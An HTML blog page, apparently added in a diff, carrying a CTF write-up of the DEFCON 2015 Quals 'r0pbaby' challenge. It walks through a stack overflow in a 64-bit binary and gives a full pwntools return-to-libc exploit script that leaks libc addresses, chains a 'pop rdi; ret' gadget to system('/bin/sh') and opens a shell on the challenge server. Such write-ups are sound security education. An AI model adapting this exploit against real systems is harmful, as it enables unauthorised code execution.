@@ -1,0 +1,632 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>DEFCON CTF 2015 Quals – r0pbaby - Hacking Tube 2.0</title>
+<meta name="description" content="Category: Baby’s FirstPoints: 1  r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="DEFCON CTF 2015 Quals – r0pbaby">
+<meta property="og:url" content="http://0.0.0.0:4000/defcon-ctf-2015-quals-r0pbaby/">
+
+
+  <meta property="og:description" content="Category: Baby’s FirstPoints: 1  r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-05-23T22:38:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/defcon-ctf-2015-quals-r0pbaby/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="DEFCON CTF 2015 Quals – r0pbaby">
+    <meta itemprop="description" content="Category: Baby’s FirstPoints: 1  r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436">
+    <meta itemprop="datePublished" content="May 23, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">DEFCON CTF 2015 Quals – r0pbaby
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Baby’s First
+<strong>Points:</strong> 1</p>
+<blockquote>
+  <p>r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436</p>
+</blockquote>
+
+<!-- more -->
+
+<p>64 bit ELF. No stack guard, but it has NX &amp; PIE protection.<br />
+The service will give you a menu first:</p>
+<blockquote>
+  <p>Welcome to an easy Return Oriented Programming challenge…
+Menu:
+1) Get libc address
+2) Get address of a libc function
+3) Nom nom r0p buffer to stack
+4) Exit</p>
+</blockquote>
+
+<p>Th first one will print out the <code class="highlighter-rouge">libc.so.6</code>’s address, which contains the <strong>real</strong> libc base address. The second one will ask you to input a libc function’s symbol, and print out the function’s address. The third one will ask you to input a number(string length) and a string.</p>
+
+<p>After we check the binary with IDA Pro, we found the following informations:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// our input buffer
+</span><span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">savedregs</span><span class="p">;</span> <span class="c1">// dest
+</span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">savedregs</span><span class="p">,</span> <span class="n">nptr</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Our input will be stored at <code class="highlighter-rouge">nptr</code> first, then it’ll be memcpy to <code class="highlighter-rouge">savedregs</code>. Let’s check the location of <code class="highlighter-rouge">savedregs</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">1088</span><span class="p">];</span> <span class="c1">// [sp+10h] [bp-440h]@2
+</span><span class="n">__int64</span> <span class="n">savedregs</span><span class="p">;</span> <span class="c1">// [sp+450h] [bp+0h]@22 // on rpb
+</span></code></pre></div></div>
+
+<p>Right on the <code class="highlighter-rouge">rbp</code>!<br />
+So everytime we choose <code class="highlighter-rouge">3)</code> and input something, it’ll be copy to <code class="highlighter-rouge">rbp</code>, which means we can overwrite the return address. Since the binary has the <strong>NX protection</strong>, we better try the <strong>return-2-libc</strong> attack.</p>
+
+<p>The key point is to find a useful gadget. At first I try to leak the libc’s base address, and attempt to guess the libc’s version so I can calculate the <code class="highlighter-rouge">/bin/sh</code> and <code class="highlighter-rouge">pop rdi, ret</code> gadget. But I end with failure, since there’s no other memory leakage vulnerability. At this moment, my teammate <strong>bananaapple</strong> propose a solution: <strong>How about we find a gadget that’s inside a function?</strong></p>
+
+<p>For instance, if we want to find a gadget <code class="highlighter-rouge">pop rdi, ret</code>, since <code class="highlighter-rouge">pop rdi, ret</code> = <code class="highlighter-rouge">5f c3</code> in machine code, we’ll just have to find a functions that contains 2 bytes data <code class="highlighter-rouge">5f c3</code>, then we can calculate the offset and get the gadget’s address.</p>
+
+<p>Using the aforementioned method, we quickly found that <code class="highlighter-rouge">5f c3</code> was at <code class="highlighter-rouge">_IO_proc_open</code> + 0x34d and <code class="highlighter-rouge">/bin/sh</code> was at <code class="highlighter-rouge">_libc_intl_domainname</code> + 0x0242. With these informations, we can now construct a ROP chain and exploit the service:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c">#HOST = "localhost"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">10436</span>
+<span class="c">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc-2.19.so"</span>
+
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+
+    <span class="c"># get system address</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"system"</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">: "</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">s</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">1)"</span><span class="p">):]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+
+    <span class="c"># get _IO_proc_open address to calculate [pop rdi, ret]'s address</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"_IO_proc_open"</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">: "</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">s</span>
+    <span class="n">open_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">1)"</span><span class="p">):]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">open_addr</span> <span class="o">+</span> <span class="mh">0x34c</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi_ret: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">))</span>
+ 
+    <span class="c"># get _libc_intl_domainname address to calculate /bin/sh's address</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"_libc_intl_domainname"</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">: "</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">s</span>
+    <span class="n">domain_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">1)"</span><span class="p">):]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">domain_addr</span> <span class="o">+</span> <span class="mh">0x242</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"AAAAAAAA"</span> <span class="c"># rbp</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="c"># pop rdi, ret</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="c"># char* point to /bin/sh</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="c"># system</span>
+
+    <span class="c"># send the payload</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#defcon" class="page__taxonomy-item" rel="tag">DEFCON</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rop" class="page__taxonomy-item" rel="tag">ROP</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-05-23T22:38:00+08:00">May 23, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=DEFCON+CTF+2015+Quals+--+r0pbaby%20http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-r0pbaby%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-r0pbaby%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-r0pbaby%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/asis-ctf-2015-quals/" class="pagination--pager" title="ASIS CTF 2015 Quals – grids
+">Previous</a>
+    
+    
+      <a href="/defcon-ctf-2015-quals-mathwhiz/" class="pagination--pager" title="DEFCON CTF 2015 Quals – mathwhiz
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/defcon-ctf-2015-quals-r0pbaby/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/defcon-ctf-2015-quals-r0pbaby"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
